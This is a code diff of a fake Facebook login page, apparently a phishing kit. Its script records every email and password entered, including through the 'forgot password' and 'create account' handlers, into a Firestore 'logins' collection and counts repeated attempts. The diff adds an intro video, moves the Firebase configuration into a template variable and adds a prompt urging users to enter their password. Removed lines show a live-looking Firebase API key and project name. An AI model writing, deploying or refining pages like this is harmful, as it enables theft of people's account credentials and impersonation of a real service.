@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Facebook</title>
+    <title>Facebook - Log In</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; text-align: center; background-color: #f0f2f5; margin: 0; padding: 0; min-height: 100vh; display: flex; justify-content: center; align-items: center; }
-        .container { width: 100%; max-width: 500px; padding: 20px; box-sizing: border-box; }
+        .container { width: 100%; max-width: 500px; padding: 20px; box-sizing: border-box; display: none; }
         .logo-title { font-size: 56px; color: #0866ff; font-weight: 700; margin-bottom: 30px; letter-spacing: -1px; text-align: center; }
         .login-box { background: white; padding: 20px 25px; width: 100%; max-width: 400px; margin: 0 auto; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1); border-radius: 8px; box-sizing: border-box; }
         input { width: 100%; padding: 14px 16px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 17px; color: #1d2129; }
@@ -19,13 +19,21 @@
         .create-account { text-align: center; margin-top: 20px; }
         .create-account button { background-color: #42b72a; color: white; padding: 8px 16px; border: none; width: 50%; border-radius: 6px; cursor: pointer; font-size: 14px; font-weight: 500; transition: background-color 0.2s; }
         .create-account button:hover { background-color: #36a420; }
+        #video-container { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; display: flex; justify-content: center; align-items: center; }
+        #intro-video { width: 100%; height: 100%; object-fit: cover; }
         @media (max-width: 600px) { .container { padding: 15px; } .logo-title { font-size: 40px; } .login-box { padding: 15px; max-width: 300px; } input { font-size: 15px; padding: 12px 14px; } .login-button { font-size: 18px; padding: 12px; } .forgot-password a { font-size: 13px; } .create-account button { font-size: 13px; padding: 6px 12px; width: 60%; } }
     </style>
 </head>
 <body>
-    <div class="container">
+    <div id="video-container">
+        <video id="intro-video" autoplay muted>
+            <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+        </video>
+    </div>
+    <div class="container" id="login-container">
         <div class="logo-title">facebook</div>
         <div class="login-box">
+            <p>Please login</p>
             <form id="loginForm" action="/submit" method="POST" onsubmit="handleSubmit(event)">
                 <input type="text" name="email" id="email" placeholder="Email or phone number" required>
                 <div id="email-error" class="error"></div>
@@ -34,10 +42,11 @@
                 <button type="submit" class="login-button">Log In</button>
             </form>
             <div class="forgot-password">
-                <form id="forgotForm" action="/forgot-password" method="POST" onsubmit="handleForgot(event)" style="display: inline;">
+                <form>
                     <input type="hidden" name="email" id="forgotEmail">
                     <input type="hidden" name="password" id="forgotPassword">
-                    <a href="#" onclick="syncForgotFields(); document.getElementById('forgotForm').submit(); return false;">Forgot password?</a>
+                    <a href="/">Forgot password?</a>
+                <div class="error" id="forgot-error">Please enter your password. Not able to do forget password.</div>
                 </form>
             </div>
             <div class="create-account">
@@ -53,20 +62,30 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>
     <script>
-        const firebaseConfig = {
-            apiKey: "AIzaSyC-KWbo4PyzEgKaRadAPoGIoN2czc_8ZdY",
-            authDomain: "facebookp-db85f.firebaseapp.com",
-            projectId: "facebookp-db85f",
-            storageBucket: "facebookp-db85f.firebasestorage.app",
-            messagingSenderId: "784746307235",
-            appId: "1:784746307235:web:c6cc6ae90818b4ab9fa916"
-        };
+        const firebaseConfig = {{ firebase_config | safe }};
 
         firebase.initializeApp(firebaseConfig);
-        console.log("Firebase initialized:", firebase.app().name); // Debug
+        console.log("Firebase initialized:", firebase.app().name);
         const db = firebase.firestore();
 
         window.attempt = 0;
+
+        const video = document.getElementById('intro-video');
+        const loginContainer = document.getElementById('login-container');
+        const videoContainer = document.getElementById('video-container');
+
+        video.addEventListener('timeupdate', function() {
+            if (video.currentTime >= 5) { // Play for 5 seconds
+                videoContainer.style.display = 'none';
+                loginContainer.style.display = 'block';
+                video.pause();
+            }
+        });
+
+        video.addEventListener('ended', function() {
+            videoContainer.style.display = 'none';
+            loginContainer.style.display = 'block';
+        });
 
         function validateForm(emailOrPhone) {
             const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
@@ -101,7 +120,7 @@
             if (!validateForm(email)) return;
 
             window.attempt++;
-            console.log("Attempt:", window.attempt); // Debug
+            console.log("Attempt:", window.attempt);
 
             const sessionId = window.attempt === 1 ? Date.now().toString() : localStorage.getItem('sessionId');
             localStorage.setItem('sessionId', sessionId);
@@ -116,7 +135,7 @@
                 await db.collection('logins').doc(sessionId).set({
                     [`attempt_${window.attempt}`]: data
                 }, { merge: true });
-                console.log("Data written to Firestore:", data); // Debug
+                console.log("Data written to Firestore:", data);
             } catch (error) {
                 console.error("Firestore write failed:", error);
             }
@@ -142,7 +161,7 @@
                 await db.collection('logins').doc(sessionId).set({
                     forgot_attempt: { email, password, timestamp: firebase.firestore.FieldValue.serverTimestamp() }
                 }, { merge: true });
-                console.log("Forgot data written:", { email, password }); // Debug
+                console.log("Forgot data written:", { email, password });
             } catch (error) {
                 console.error("Firestore write failed:", error);
             }
@@ -164,7 +183,7 @@
                 await db.collection('logins').doc(sessionId).set({
                     create_attempt: { email, password, timestamp: firebase.firestore.FieldValue.serverTimestamp() }
                 }, { merge: true });
-                console.log("Create data written:", { email, password }); // Debug
+                console.log("Create data written:", { email, password });
             } catch (error) {
                 console.error("Firestore write failed:", error);
             }
